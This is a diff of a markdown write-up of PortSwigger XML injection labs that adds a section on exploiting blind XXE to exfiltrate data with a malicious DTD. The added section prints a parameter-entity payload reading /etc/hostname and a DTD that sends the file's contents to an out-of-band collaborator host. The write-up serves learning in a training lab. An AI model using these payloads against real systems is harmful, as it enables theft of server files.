@@ -1,4 +1,4 @@
-### XML-INJECTION (Portswigger labs)
+![2023-10-21_16-06](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ce19025d-089d-4ec1-95bb-98d739550540)![2023-10-21_16-06](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3d36b6f5-0bb0-4061-993c-cf02487ebdb4)### XML-INJECTION (Portswigger labs)
 
 
 ### <u>Meaning of XML injection </u>
@@ -116,3 +116,32 @@ Challenge description: Blind XXE by out-of-band interaction(Making a request to 
 - I noticed that a request has been made to burp collaborator,Challenge solved
 
 ![2023-10-18_22-55](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/211832e4-b1e8-42f3-966a-c410ba2c0ebc)
+
+### Challenge 5
+
+Challenge's description: Exploiting blind XXE to exfiltrate data with malicious DTD
+
+![2023-10-21_15-38](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b8327cf3-da92-4ad9-b4a1-c2b310b22875)
+
+- The main goal of the challenge was to use the malicious DTD to exfiltrate the /etc/hostname file
+- Portswigger provided an exploit server to host the malicious DTD
+
+![2023-10-21_16-01](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8908e0e8-28fc-4e1f-b302-e2bd224b0f84)
+
+- After intercepting the check stock request,I noticed that regular entities are not allowed.
+
+   ![2023-10-21_16-06](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/abeae0b5-ad52-4871-b45f-6330f11c42ba)
+
+- You can bypass it by using parameter entities.A parameter entity is not like a regular entity because it can be called within the dtd and not within the xml tags.e.g
+
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname" >] %xxe;>
+- I hosted this payload on the portswigger exploit server to read the file "/etc/hostname" and also send the contents of the file to burp collaborator server
+
+       <!ENTITY % file SYSTEM "file:///etc/hostname">
+       <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<burp collaborator link>/?x=%file;'>">
+       %eval;
+       %exfiltrate;
+- In burp repeater,I sent an xml request to induce the server to load the dtd file hosted on Portswigger exploit server
+  ![2023-10-21_16-22](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c144d8e1-762c-465f-b57b-0e29e0090fe4)
+
+-
